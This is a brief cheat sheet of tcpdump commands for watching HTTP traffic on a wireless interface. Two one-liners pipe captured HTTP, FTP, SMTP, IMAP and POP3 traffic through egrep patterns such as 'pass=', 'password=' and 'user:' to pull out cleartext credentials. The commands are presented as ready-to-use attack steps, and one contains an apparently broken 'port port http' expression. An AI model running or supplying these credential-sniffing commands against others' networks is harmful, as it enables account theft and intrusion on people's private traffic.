##Monitor HTTP traffic on wlan0
tcpdump -i wlan0 -A port http

##Capture credentials on http
tcpdump -i wlan0 -A port http | egrep -i ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user | uname= ‘

##Capture credentials on all protocols
tcpdump -i wlan0 -A port port http or port ftp or port smtp or port imap or port pop3 | egrep -i ‘pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user | uname= ‘

##See what traffic is hitting you
tcpdump -i wlan0 -n  | head

##Find all HOST headers
tcpdump -s0 -vv | grep "Host:"

##
